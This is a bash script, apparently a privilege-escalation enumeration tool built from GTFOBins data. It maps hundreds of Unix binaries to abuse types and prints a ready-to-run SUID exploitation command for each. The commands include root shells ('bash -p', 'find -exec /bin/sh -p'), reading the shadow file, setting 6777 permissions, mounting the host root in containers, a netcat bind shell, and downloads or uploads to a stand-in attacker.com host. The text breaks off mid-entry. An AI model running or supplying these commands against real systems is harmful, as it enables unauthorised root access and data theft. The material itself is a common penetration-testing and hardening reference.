#!/bin/bash
# GTFOBins Auto-Checker — finds exploitable SUID, SGID, capabilities, and sudo on this system
# Data: GTFOBins (https://gtfobins.github.io/) — 435 binaries
# Generated: 2026-11-06

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ========== SUID LOOKUP ==========
is_suid_exploitable() {
  local b="$1"
  case "$b" in
    R) echo 'shell'; return 0 ;;
    aa-exec) echo 'shell'; return 0 ;;
    ab) echo 'download,upload'; return 0 ;;
    acr) echo 'command'; return 0 ;;
    agetty) echo 'shell'; return 0 ;;
    alpine) echo 'file-read'; return 0 ;;
    apache2) echo 'file-read,file-read'; return 0 ;;
    apt-get) echo 'shell,shell'; return 0 ;;
    ar) echo 'file-read'; return 0 ;;
    aria2c) echo 'command,command,download,file-read'; return 0 ;;
    arj) echo 'file-read,file-write'; return 0 ;;
    arp) echo 'file-read'; return 0 ;;
    as) echo 'file-read'; return 0 ;;
    ascii-xfr) echo 'file-read'; return 0 ;;
    ash) echo 'file-write,shell'; return 0 ;;
    aspell) echo 'file-read,file-read'; return 0 ;;
    asterisk) echo 'shell'; return 0 ;;
    atobm) echo 'file-read'; return 0 ;;
    aws) echo 'file-read'; return 0 ;;
    base32) echo 'file-read'; return 0 ;;
    base64) echo 'file-read'; return 0 ;;
    basenc) echo 'file-read'; return 0 ;;
    basez) echo 'file-read'; return 0 ;;
    bash) echo 'download,download,file-read,file-read,file-write,file-write,library-load,reverse-shell,shell,upload,upload'; return 0 ;;
    batcat) echo 'inherit'; return 0 ;;
    bc) echo 'file-read'; return 0 ;;
    bconsole) echo 'file-read'; return 0 ;;
    bridge) echo 'file-read'; return 0 ;;
    busctl) echo 'inherit,shell,shell'; return 0 ;;
    bzip2) echo 'file-read'; return 0 ;;
    cabal) echo 'shell'; return 0 ;;
    cancel) echo 'upload'; return 0 ;;
    capsh) echo 'shell'; return 0 ;;
    cat) echo 'file-read'; return 0 ;;
    chattr) echo 'privilege-escalation'; return 0 ;;
    chmod) echo 'privilege-escalation'; return 0 ;;
    choom) echo 'shell'; return 0 ;;
    chown) echo 'privilege-escalation'; return 0 ;;
    chroot) echo 'shell'; return 0 ;;
    chrt) echo 'shell'; return 0 ;;
    clamscan) echo 'file-read'; return 0 ;;
    clisp) echo 'shell'; return 0 ;;
    cmp) echo 'file-read'; return 0 ;;
    cobc) echo 'shell'; return 0 ;;
    column) echo 'file-read'; return 0 ;;
    comm) echo 'file-read'; return 0 ;;
    cp) echo 'file-read,file-write,privilege-escalation,privilege-escalation'; return 0 ;;
    cpio) echo 'file-read,file-read,file-write'; return 0 ;;
    cpulimit) echo 'shell'; return 0 ;;
    crash) echo 'inherit'; return 0 ;;
    csh) echo 'file-write,shell'; return 0 ;;
    csplit) echo 'file-read,file-write'; return 0 ;;
    csvtool) echo 'file-read,file-write,shell'; return 0 ;;
    ctr) echo 'shell'; return 0 ;;
    cupsfilter) echo 'file-read'; return 0 ;;
    curl) echo 'download,file-read,file-write,library-load,upload,upload,upload'; return 0 ;;
    cut) echo 'file-read'; return 0 ;;
    dash) echo 'file-write,shell'; return 0 ;;
    date) echo 'file-read'; return 0 ;;
    dc) echo 'shell'; return 0 ;;
    dd) echo 'file-read,file-write'; return 0 ;;
    debugfs) echo 'shell'; return 0 ;;
    dialog) echo 'file-read'; return 0 ;;
    diff) echo 'file-read,file-read'; return 0 ;;
    dig) echo 'file-read'; return 0 ;;
    distcc) echo 'shell'; return 0 ;;
    dmesg) echo 'file-read,inherit'; return 0 ;;
    dmsetup) echo 'shell'; return 0 ;;
    dnsmasq) echo 'command'; return 0 ;;
    docker) echo 'file-read,file-write,shell,shell'; return 0 ;;
    dos2unix) echo 'file-read,file-write'; return 0 ;;
    dosbox) echo 'file-read,file-read,file-write'; return 0 ;;
    dpkg) echo 'inherit'; return 0 ;;
    dvips) echo 'shell'; return 0 ;;
    easyrsa) echo 'shell'; return 0 ;;
    ed) echo 'file-read,file-write,shell'; return 0 ;;
    efax) echo 'file-read'; return 0 ;;
    egrep) echo 'file-read'; return 0 ;;
    elvish) echo 'file-read,file-write,shell'; return 0 ;;
    enscript) echo 'shell'; return 0 ;;
    env) echo 'shell'; return 0 ;;
    eqn) echo 'file-read'; return 0 ;;
    espeak) echo 'file-read'; return 0 ;;
    ex) echo 'inherit,shell'; return 0 ;;
    expand) echo 'file-read'; return 0 ;;
    expect) echo 'file-read,shell'; return 0 ;;
    fastfetch) echo 'command,file-read,shell'; return 0 ;;
    ffmpeg) echo 'library-load'; return 0 ;;
    fgrep) echo 'file-read'; return 0 ;;
    file) echo 'file-read,file-read'; return 0 ;;
    find) echo 'file-read,file-write,shell'; return 0 ;;
    finger) echo 'download,upload'; return 0 ;;
    fish) echo 'shell'; return 0 ;;
    flock) echo 'shell'; return 0 ;;
    fmt) echo 'file-read,file-read'; return 0 ;;
    fold) echo 'file-read'; return 0 ;;
    forge) echo 'shell'; return 0 ;;
    fping) echo 'file-read'; return 0 ;;
    ftp) echo 'download,shell,upload'; return 0 ;;
    fzf) echo 'command,shell'; return 0 ;;
    gawk) echo 'bind-shell,file-read,file-write,reverse-shell,shell'; return 0 ;;
    gcloud) echo 'inherit'; return 0 ;;
    gcore) echo 'file-read'; return 0 ;;
    gdb) echo 'file-write'; return 0 ;;
    genie) echo 'shell'; return 0 ;;
    genisoimage) echo 'file-read,file-read'; return 0 ;;
    getent) echo 'privilege-escalation'; return 0 ;;
    ginsh) echo 'shell'; return 0 ;;
    git) echo 'file-read,file-write,shell'; return 0 ;;
    gnuplot) echo 'shell'; return 0 ;;
    grep) echo 'file-read'; return 0 ;;
    gtester) echo 'file-write,shell'; return 0 ;;
    guile) echo 'shell'; return 0 ;;
    gzip) echo 'file-read'; return 0 ;;
    head) echo 'file-read'; return 0 ;;
    hexdump) echo 'file-read'; return 0 ;;
    hg) echo 'shell'; return 0 ;;
    highlight) echo 'file-read'; return 0 ;;
    hping3) echo 'shell'; return 0 ;;
    iconv) echo 'file-read,file-write'; return 0 ;;
    iftop) echo 'shell'; return 0 ;;
    install) echo 'privilege-escalation'; return 0 ;;
    ionice) echo 'shell'; return 0 ;;
    ip) echo 'file-read,shell'; return 0 ;;
    ispell) echo 'shell'; return 0 ;;
    joe) echo 'shell'; return 0 ;;
    join) echo 'file-read'; return 0 ;;
    jq) echo 'file-read'; return 0 ;;
    jrunscript) echo 'shell'; return 0 ;;
    julia) echo 'download,file-read,file-write,reverse-shell,shell'; return 0 ;;
    ksshell) echo 'file-read'; return 0 ;;
    kubectl) echo 'upload'; return 0 ;;
    last) echo 'file-read'; return 0 ;;
    latex) echo 'file-read,file-write,shell'; return 0 ;;
    ld.so) echo 'shell'; return 0 ;;
    ldconfig) echo 'library-load'; return 0 ;;
    less) echo 'file-read,file-read,file-write,inherit,shell'; return 0 ;;
    lftp) echo 'shell'; return 0 ;;
    links) echo 'file-read'; return 0 ;;
    logrotate) echo 'file-read,file-write'; return 0 ;;
    logsave) echo 'shell'; return 0 ;;
    look) echo 'file-read'; return 0 ;;
    lp) echo 'upload'; return 0 ;;
    ltrace) echo 'file-read'; return 0 ;;
    lua) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    lxd) echo 'shell,shell'; return 0 ;;
    m4) echo 'command,file-read,shell'; return 0 ;;
    mail) echo 'shell,shell'; return 0 ;;
    make) echo 'file-read,file-write,shell'; return 0 ;;
    man) echo 'file-read,inherit,shell'; return 0 ;;
    mawk) echo 'file-read,file-write,shell'; return 0 ;;
    minicom) echo 'shell,shell'; return 0 ;;
    more) echo 'file-read,shell'; return 0 ;;
    mosquitto) echo 'file-read'; return 0 ;;
    msgattrib) echo 'file-read'; return 0 ;;
    msgcat) echo 'file-read'; return 0 ;;
    msgconv) echo 'file-read'; return 0 ;;
    msgfilter) echo 'file-read,shell'; return 0 ;;
    msgmerge) echo 'file-read'; return 0 ;;
    msguniq) echo 'file-read'; return 0 ;;
    multitime) echo 'shell'; return 0 ;;
    mv) echo 'file-write,privilege-escalation'; return 0 ;;
    mysql) echo 'library-load,shell'; return 0 ;;
    nano) echo 'file-read,file-write,shell,shell'; return 0 ;;
    nasm) echo 'file-read'; return 0 ;;
    nc) echo 'bind-shell,download,download,reverse-shell,upload,upload'; return 0 ;;
    ncdu) echo 'shell'; return 0 ;;
    ncftp) echo 'shell'; return 0 ;;
    nginx) echo 'library-load'; return 0 ;;
    nice) echo 'shell'; return 0 ;;
    nl) echo 'file-read'; return 0 ;;
    nm) echo 'file-read'; return 0 ;;
    nmap) echo 'file-read,file-write'; return 0 ;;
    node) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    nohup) echo 'command,shell'; return 0 ;;
    nsenter) echo 'shell'; return 0 ;;
    ntpdate) echo 'file-read'; return 0 ;;
    octave) echo 'file-read,file-write,shell'; return 0 ;;
    od) echo 'file-read'; return 0 ;;
    opencode) echo 'command'; return 0 ;;
    openssl) echo 'download,file-read,file-write,file-write,library-load,reverse-shell,upload'; return 0 ;;
    openvpn) echo 'file-read,shell'; return 0 ;;
    pandoc) echo 'file-read,file-write'; return 0 ;;
    paste) echo 'file-read'; return 0 ;;
    pax) echo 'file-read'; return 0 ;;
    pdflatex) echo 'file-read,file-write,shell'; return 0 ;;
    pdftex) echo 'shell'; return 0 ;;
    perf) echo 'shell'; return 0 ;;
    perl) echo 'file-read'; return 0 ;;
    pexec) echo 'shell'; return 0 ;;
    pg) echo 'file-read,shell'; return 0 ;;
    php) echo 'command,command,command,download,file-read,file-write,reverse-shell,shell,shell,shell,shell,upload'; return 0 ;;
    pic) echo 'file-read,shell'; return 0 ;;
    pidstat) echo 'shell'; return 0 ;;
    plymouth) echo 'shell'; return 0 ;;
    pr) echo 'file-read'; return 0 ;;
    psftp) echo 'shell'; return 0 ;;
    psql) echo 'inherit,shell'; return 0 ;;
    ptx) echo 'file-read'; return 0 ;;
    python) echo 'download,file-read,file-write,library-load,reverse-shell,shell,upload,upload'; return 0 ;;
    qpdf) echo 'file-read'; return 0 ;;
    rc) echo 'shell'; return 0 ;;
    readelf) echo 'file-read'; return 0 ;;
    redis) echo 'file-write'; return 0 ;;
    restic) echo 'command,command,shell,shell,upload'; return 0 ;;
    rev) echo 'file-read'; return 0 ;;
    rlogin) echo 'upload'; return 0 ;;
    rlwrap) echo 'file-write,shell'; return 0 ;;
    rsync) echo 'shell'; return 0 ;;
    rtorrent) echo 'shell'; return 0 ;;
    run-parts) echo 'shell,shell'; return 0 ;;
    runscript) echo 'shell'; return 0 ;;
    sash) echo 'shell'; return 0 ;;
    scanmem) echo 'shell'; return 0 ;;
    scp) echo 'download,shell,shell,upload'; return 0 ;;
    script) echo 'file-write,shell'; return 0 ;;
    scrot) echo 'shell'; return 0 ;;
    sed) echo 'file-read,file-write,shell,shell'; return 0 ;;
    setarch) echo 'shell'; return 0 ;;
    setcap) echo 'privilege-escalation'; return 0 ;;
    setfacl) echo 'privilege-escalation'; return 0 ;;
    setlock) echo 'shell'; return 0 ;;
    sftp) echo 'download,shell,upload'; return 0 ;;
    shred) echo 'file-write'; return 0 ;;
    shuf) echo 'file-read,file-write'; return 0 ;;
    slsh) echo 'shell'; return 0 ;;
    socat) echo 'bind-shell,download,file-read,file-write,reverse-shell,shell,upload'; return 0 ;;
    socket) echo 'bind-shell,reverse-shell'; return 0 ;;
    soelim) echo 'file-read'; return 0 ;;
    softlimit) echo 'shell'; return 0 ;;
    sort) echo 'file-read,file-write'; return 0 ;;
    split) echo 'file-read,file-write,shell'; return 0 ;;
    sqlite3) echo 'file-read,file-write,shell'; return 0 ;;
    ss) echo 'file-read'; return 0 ;;
    ssh) echo 'download,file-read,shell,upload'; return 0 ;;
    ssh-agent) echo 'shell'; return 0 ;;
    ssh-keygen) echo 'library-load'; return 0 ;;
    ssh-keyscan) echo 'file-read'; return 0 ;;
    sshpass) echo 'shell'; return 0 ;;
    start-stop-daemon) echo 'shell'; return 0 ;;
    stdbuf) echo 'shell'; return 0 ;;
    strace) echo 'shell'; return 0 ;;
    strings) echo 'file-read'; return 0 ;;
    sysctl) echo 'command,file-read'; return 0 ;;
    systemctl) echo 'inherit,shell'; return 0 ;;
    tac) echo 'file-read'; return 0 ;;
    tail) echo 'file-read'; return 0 ;;
    tar) echo 'download,file-read,file-write,shell,shell,shell,upload'; return 0 ;;
    task) echo 'shell'; return 0 ;;
    tasksh) echo 'shell'; return 0 ;;
    tbl) echo 'file-read'; return 0 ;;
    tclsh) echo 'library-load,reverse-shell,shell'; return 0 ;;
    tcpdump) echo 'file-write'; return 0 ;;
    tcsh) echo 'file-write,shell'; return 0 ;;
    tdbtool) echo 'shell'; return 0 ;;
    tee) echo 'file-write'; return 0 ;;
    telnet) echo 'reverse-shell,shell'; return 0 ;;
    terraform) echo 'file-read'; return 0 ;;
    tex) echo 'shell'; return 0 ;;
    tftp) echo 'download,upload'; return 0 ;;
    tic) echo 'file-read'; return 0 ;;
    time) echo 'shell'; return 0 ;;
    timeout) echo 'shell'; return 0 ;;
    tmate) echo 'shell'; return 0 ;;
    tmux) echo 'file-read,shell,shell'; return 0 ;;
    troff) echo 'file-read'; return 0 ;;
    ul) echo 'file-read'; return 0 ;;
    unexpand) echo 'file-read'; return 0 ;;
    uniq) echo 'file-read'; return 0 ;;
    unshare) echo 'shell'; return 0 ;;
    unsquashfs) echo 'privilege-escalation'; return 0 ;;
    unzip) echo 'privilege-escalation'; return 0 ;;
    update-alternatives) echo 'file-write'; return 0 ;;
    urlget) echo 'file-read'; return 0 ;;
    uuencode) echo 'file-read'; return 0 ;;
    varnishncsa) echo 'file-write'; return 0 ;;
    vi) echo 'file-read,file-write,shell,shell,shell,shell'; return 0 ;;
    vigr) echo 'inherit'; return 0 ;;
    vim) echo 'file-read'; return 0 ;;
    vipw) echo 'inherit'; return 0 ;;
    w3m) echo 'file-read'; return 0 ;;
    watch) echo 'shell,shell'; return 0 ;;
    wc) echo 'file-read'; return 0 ;;
    wget) echo 'download,file-read,file-write,shell,upload,upload'; return 0 ;;
    whiptail) echo 'file-read'; return 0 ;;
    whois) echo 'download,upload'; return 0 ;;
    wish) echo 'inherit'; return 0 ;;
    xargs) echo 'file-read,shell,shell,shell'; return 0 ;;
    xdotool) echo 'shell'; return 0 ;;
    xmodmap) echo 'file-read'; return 0 ;;
    xmore) echo 'file-read'; return 0 ;;
    xpad) echo 'file-read'; return 0 ;;
    xxd) echo 'file-read,file-write'; return 0 ;;
    xz) echo 'file-read'; return 0 ;;
    yash) echo 'shell'; return 0 ;;
    zic) echo 'command'; return 0 ;;
    zip) echo 'file-read,shell'; return 0 ;;
    zless) echo 'inherit'; return 0 ;;
    zsh) echo 'download,file-read,file-read,file-write,inherit,reverse-shell,shell,upload'; return 0 ;;
    zsoelim) echo 'file-read'; return 0 ;;
    *) return 1 ;;
  esac
}

get_suid_exploit() {
  local b="$1"
  case "$b" in
    R) echo 'R --no-save -e '\''system("/bin/sh")'\''' ;;
    aa-exec) echo 'aa-exec /bin/sh' ;;
    ab) echo 'ab -v2 http://attacker.com/path/to/input-file' ;;
    acr) echo 'echo -e '\''x:\\n\\t/bin/sh 1>&0 2>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
acr -r ./relative/path/to/temp-file' ;;
    agetty) echo 'agetty -l /bin/sh -o -p -a root tty' ;;
    alpine) echo 'alpine -F /path/to/input-file' ;;
    apache2) echo 'apache2 -f /path/to/input-file' ;;
    apt-get) echo 'echo '\''Dpkg::Pre-Invoke {"/bin/sh;false"}'\'' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl' ;;
    ar) echo 'ar r /path/to/output-file /path/to/input-file
ar p /path/to/output-file' ;;
    aria2c) echo 'echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain' ;;
    arj) echo 'arj a /path/to/output-file /path/to/input-file
arj p /path/to/output-file' ;;
    arp) echo 'arp -v -f /path/to/input-file' ;;
    as) echo 'as @/path/to/input-file' ;;
    ascii-xfr) echo 'ascii-xfr -ns /path/to/input-file' ;;
    ash) echo 'ash -p' ;;
    aspell) echo 'aspell -c /path/to/input-file' ;;
    asterisk) echo 'asterisk -r
!/bin/sh' ;;
    atobm) echo 'atobm /path/to/input-file' ;;
    aws) echo 'aws ec2 describe-instances --filter file:///path/to/input-file' ;;
    base32) echo 'base32 /path/to/input-file | base32 --decode' ;;
    base64) echo 'base64 /path/to/input-file | base64 --decode' ;;
    basenc) echo 'basenc --base64 /path/to/input-file | basenc -d --base64' ;;
    basez) echo 'basez /path/to/input-file | basez --decode' ;;
    bash) echo 'bash -p' ;;
    batcat) echo 'batcat --paging always /etc/hosts' ;;
    bc) echo 'bc -s /path/to/input-file
quit' ;;
    bconsole) echo 'bconsole -c /path/to/file-input' ;;
    bridge) echo 'bridge -b /path/to/input-file' ;;
    busctl) echo 'busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='\''/bin/sh -p -i 0<&2 1>&2'\''' ;;
    bzip2) echo 'bzip2 -c /path/to/input-file | bzip2 -d' ;;
    cabal) echo 'cabal exec --project-file=/dev/null -- /bin/sh -p' ;;
    cancel) echo 'cancel -h attacker.com:12345 -u DATA' ;;
    capsh) echo 'capsh --gid=0 --uid=0 --' ;;
    cat) echo 'cat /path/to/input-file' ;;
    chattr) echo 'chattr +i /path/to/input-file' ;;
    chmod) echo 'chmod 6777 /path/to/input-file' ;;
    choom) echo 'choom -n 0 -- /bin/sh -p' ;;
    chown) echo 'chown $(id -un):$(id -gn) /path/to/input-file' ;;
    chroot) echo 'chroot / /bin/sh -p' ;;
    chrt) echo 'chrt 1 /bin/sh -p' ;;
    clamscan) echo 'touch x.yara
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE '\''s/^(.*): No such file or directory$/\\1/p'\''' ;;
    clisp) echo 'clisp -x '\''(ext:run-shell-command "/bin/sh")(ext:exit)'\''' ;;
    cmp) echo 'cmp /path/to/input-file /dev/zero -b -l' ;;
    cobc) echo 'echo '\''CALL "SYSTEM" USING "/bin/sh".'\'' >/path/to/temp-file
cobc -xFj --frelax-syntax-checks /path/to/temp-file' ;;
    column) echo 'column /path/to/input-file' ;;
    comm) echo 'comm /path/to/input-file /dev/null' ;;
    cp) echo 'cp /path/to/input-file /dev/stdout' ;;
    cpio) echo 'echo /path/to/input-file | cpio -o' ;;
    cpulimit) echo 'cpulimit -l 100 -f -- /bin/sh -p' ;;
    crash) echo 'crash -h' ;;
    csh) echo 'csh -b' ;;
    csplit) echo 'csplit /path/to/input-file 1
cat xx01' ;;
    csvtool) echo 'csvtool call '\''/bin/sh;false'\'' /etc/hosts' ;;
    ctr) echo 'ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x' ;;
    cupsfilter) echo 'cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file' ;;
    curl) echo 'curl http://attacker.com/path/to/input-file -o /path/to/output-file' ;;
    cut) echo 'cut -d '\'''\'' -f1 /path/to/input-file' ;;
    dash) echo 'dash' ;;
    date) echo 'date -f /path/to/input-file' ;;
    dc) echo 'dc -e '\''!/bin/sh'\''' ;;
    dd) echo 'dd if=/path/to/input-file' ;;
    debugfs) echo 'debugfs
!/bin/sh' ;;
    dialog) echo 'dialog --textbox /path/to/input-file 0 0' ;;
    diff) echo 'diff --line-format=%L /dev/null /path/to/input-file' ;;
    dig) echo 'dig -f /path/to/input-file' ;;
    distcc) echo 'distcc /bin/sh -p' ;;
    dmesg) echo 'dmesg -rF /path/to/input-file' ;;
    dmsetup) echo 'dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '\''/bin/sh -p -s'\''' ;;
    dnsmasq) echo 'dnsmasq --conf-script='\''/path/to/command 1>&2'\''' ;;
    docker) echo 'docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh' ;;
    dos2unix) echo 'dos2unix -f -O /path/to/input-file' ;;
    dosbox) echo 'dosbox -c '\''mount c /'\'' -c '\''type c:\\path\\to\\input'\''' ;;
    dpkg) echo 'dpkg -l' ;;
    dvips) echo 'dvips -R0 texput.dvi' ;;
    easyrsa) echo 'echo '\''set_var X "$(/bin/sh 1>&0)"'\'' >/path/to/temp-file
easyrsa --vars=/path/to/temp-file' ;;
    ed) echo 'ed
!/bin/sh
q' ;;
    efax) echo 'efax -d /path/to/input-file' ;;
    egrep) echo 'grep '\'''\'' /path/to/input-file' ;;
    elvish) echo 'elvish' ;;
    enscript) echo 'enscript /dev/null -qo /dev/null -I '\''/bin/sh >&2'\''' ;;
    env) echo 'env /bin/sh -p' ;;
    eqn) echo 'eqn /path/to/input-file' ;;
    espeak) echo 'espeak -qXf /path/to/input-file' ;;
    ex) echo 'ex -c '\'':!/bin/sh'\''' ;;
    expand) echo 'expand /path/to/input-file' ;;
    expect) echo 'expect -c '\''spawn /bin/sh -p;interact'\''' ;;
    fastfetch) echo 'echo '\''{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}'\'' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc' ;;
    ffmpeg) echo 'ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
reset^J' ;;
    fgrep) echo 'grep '\'''\'' /path/to/input-file' ;;
    file) echo 'file -f /path/to/input-file' ;;
    find) echo 'find . -exec /bin/sh -p \\; -quit' ;;
    finger) echo 'finger x@attacker.com' ;;
    fish) echo 'fish' ;;
    flock) echo 'flock -u / /bin/sh -p' ;;
    fmt) echo 'fmt -pNON_EXISTING_PREFIX /path/to/input-file' ;;
    fold) echo 'fold -w999 /path/to/input-file' ;;
    forge) echo 'echo '\''#!/bin/sh'\'' >/path/to/temp-file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
chmod +x /path/to/temp-file
forge build --use /path/to/temp-file' ;;
    fping) echo 'fping -f /path/to/input-file' ;;
    ftp) echo 'ftp
!/bin/sh' ;;
    fzf) echo 'fzf --bind '\''enter:execute(/bin/sh)'\''' ;;
    gawk) echo 'gawk '\''BEGIN {system("/bin/sh")}'\''' ;;
    gcloud) echo 'gcloud help' ;;
    gcore) echo 'gcore $PID' ;;
    gdb) echo 'gdb -nx -ex '\''dump value /path/to/output-file "DATA"'\'' -ex quit' ;;
    genie) echo 'genie -c '\''/bin/sh'\''' ;;
    genisoimage) echo 'genisoimage -q -o - /path/to/input-file' ;;
    getent) echo 'getent shadow' ;;
    ginsh) echo 'ginsh
!/bin/sh' ;;
    git) echo 'ln -s /bin/sh git-x
git --exec-path=. x -p' ;;
    gnuplot) echo 'gnuplot -e '\''system("/bin/sh 1>&0")'\''' ;;
    grep) echo 'grep '\'''\'' /path/to/input-file' ;;
    gtester) echo 'echo '\''#!/bin/sh -p'\'' >/path/to/temp-file
echo '\''exec /bin/sh -p 0<&1'\'' >>/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file' ;;
    guile) echo 'guile -c '\''(system "/bin/sh")'\''' ;;
    gzip) echo 'gzip -c /path/to/input-file | gzip -d' ;;
    head) echo 'head -c-0 /path/to/input-file' ;;
    hexdump) echo 'hd /path/to/input-file' ;;
    hg) echo 'hg --config alias.x='\''!/bin/sh'\'' x' ;;
    highlight) echo 'highlight --no-doc --failsafe /path/to/input-file' ;;
    hping3) echo 'hping3
/bin/sh -p' ;;
    iconv) echo 'iconv -f 8859_1 -t 8859_1 /path/to/input-file' ;;
    iftop) echo 'iftop
!/bin/sh' ;;
    install) echo 'install -m 6777 /path/to/input-file /path/to/output-dir/' ;;
    ionice) echo 'ionice /bin/sh -p' ;;
    ip) echo 'ip netns add foo
ip netns exec foo /bin/sh -p
ip netns delete foo' ;;
    ispell) echo 'ispell /etc/hosts
!/bin/sh -p' ;;
    joe) echo 'joe
^K!/bin/sh' ;;
    join) echo 'join -a 2 /dev/null /path/to/input-file' ;;
    jq) echo 'jq -Rr . /path/to/input-file' ;;
    jrunscript) echo 'jrunscript -e '\''exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty")'\''' ;;
    julia) echo 'julia -e '\''run(`/bin/sh -p`)'\''' ;;
    ksshell) echo 'ksshell -i /path/to/input-file' ;;
    kubectl) echo 'kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/' ;;
    last) echo 'last -a -f /path/to/input-file' ;;
    latex) echo 'latex --shell-escape '\''\\immediate\\write18{/bin/sh}'\''' ;;
    ld.so) echo '/path/to/ld.so /bin/sh -p' ;;
    ldconfig) echo 'echo /path/to/temp-dir/ >/path/to/temp-file
ldconfig -f /path/to/temp-file
ping' ;;
    less) echo 'less /etc/hosts
!/bin/sh' ;;
    lftp) echo 'lftp -c '\''!/bin/sh'\''' ;;
    links) echo 'links /path/to/input-file' ;;
    logrotate) echo 'logrotate /path/to/input-file' ;;
    logsave) echo 'logsave /dev/null /bin/sh -i -p' ;;
    look) echo 'look '\'''\'' /path/to/input-file' ;;
    lp) echo 'lp /path/to/input-file -h attacker.com' ;;
    ltrace) echo 'ltrace -F /path/to/input-file /dev/null' ;;
    lua) echo 'lua -e '\''os.execute("/bin/sh")'\''' ;;
    lxd) echo 'lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh' ;;
    m4) echo 'echo '\''esyscmd(/bin/sh 0<&2 1>&2)'\'' | m4' ;;
    mail) echo 'mail --exec='\''!/bin/sh'\''' ;;
    make) echo 'make --eval='\''$(shell /bin/sh 1>&0)'\'' .' ;;
    man) echo 'man '\''-H/bin/sh #'\'' man' ;;
    mawk) echo 'mawk '\''BEGIN {system("/bin/sh")}'\''' ;;
    minicom) echo 'minicom -D /dev/null' ;;
    more) echo 'more /etc/hosts
!/bin/sh' ;;
    mosquitto) echo 'mosquitto -c /path/to/input-file' ;;
    msgattrib) echo 'msgattrib -P /path/to/input-file' ;;
    msgcat) echo 'msgcat -P /path/to/input-file' ;;
    msgconv) echo 'msgconv -P /path/to/input-file' ;;
    msgfilter) echo 'echo x | msgfilter -P /bin/sh -p -c '\''/bin/sh -p 0<&2 1>&2; kill $PPID'\''' ;;
    msgmerge) echo 'msgmerge -P /path/to/input-file /dev/null' ;;
    msguniq) echo 'msguniq -P /path/to/input-file' ;;
    multitime) echo 'multitime /bin/sh -p' ;;
    mv) echo 'echo DATA >/path/to/temp-file
mv /path/to/temp-file /path/to/output-file' ;;
    mysql) echo 'mysql -e '\''\\! /bin/sh'\''' ;;
    nano) echo 'nano
^R^X
reset; sh 1>&0 2>&0' ;;
    nasm) echo 'nasm -@ /path/to/input-file' ;;
    nc) echo 'nc -l -p 12345 -e /bin/sh' ;;
    ncdu) echo 'ncdu
b' ;;
    ncftp) echo 'ncftp
!/bin/sh -p' ;;
    nginx) echo 'cat >/path/to/temp-file <<EOF
load_module /path/to/lib.so;
EOF

nginx -t -c /path/to/temp-file' ;;
    nice) echo 'nice /bin/sh -p' ;;
    nl) echo 'nl -bn -w1 -s '\'''\'' /path/to/input-file' ;;
    nm) echo 'nm /path/to/input-file' ;;
    nmap) echo 'nmap -iL /path/to/input-file' ;;
    node) echo 'node -e '\''require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'\''' ;;
    nohup) echo 'nohup /bin/sh -p -c '\''/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'\''' ;;
    nsenter) echo 'nsenter /bin/sh -p' ;;
    ntpdate) echo 'ntpdate -a x -k /path/to/input-file -d localhost' ;;
    octave) echo 'octave-cli --eval '\''system("/bin/sh")'\''' ;;
    od) echo 'od -An -c -w999 /path/to/input-file' ;;
    opencode) echo 'opencode
! /path/to/command' ;;
    openssl) echo 'openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file' ;;
    openvpn) echo 'openvpn --dev null --script-security 2 --up '\''/bin/sh -p -s'\''' ;;
    pandoc) echo 'pandoc -t plain /path/to/input-file' ;;
    paste) echo 'paste /path/to/input-file' ;;
    pax) echo 'pax -w /path/to/input-file | tar -xO' ;;
    pdflatex) echo 'pdflatex --shell-escape '\''\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\''' ;;
    pdftex) echo 'pdftex --shell-escape '\''\\write18{/bin/sh}\\end'\''' ;;
    perf) echo 'perf stat /bin/sh -p' ;;
    perl) echo 'perl -ne print /path/to/input-file' ;;
    pexec) echo 'pexec /bin/sh -p' ;;
    pg) echo 'pg /etc/hosts
!/bin/sh' ;;
    php) echo 'php -r '\''system("/bin/sh -i");'\''' ;;
    pic) echo 'pic -U
.PS
sh X sh X' ;;
    pidstat) echo 'pidstat -e /bin/sh -p' ;;
    plymouth) echo 'plymouth ask-for-password --prompt=x --command='\''/bin/sh -p'\''' ;;
    pr) echo 'pr -T /path/to/input-file' ;;
    psftp) echo 'psftp
!/bin/sh' ;;
    psql) echo 'psql
\\! /bin/sh' ;;
    ptx) echo 'ptx -w 999 /path/to/input-file' ;;
    python) echo 'python -c '\''import os; os.execl("/bin/sh", "sh", "-p")'\''' ;;
    qpdf) echo 'qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
qpdf --show-attachment=x /path/to/output-file' ;;
    rc) echo 'rc' ;;
    readelf) echo 'readelf -a @/path/to/input-file' ;;
    redis) echo 'redis-cli -h 127.0.0.1
config set dir /path/to/output-dir/
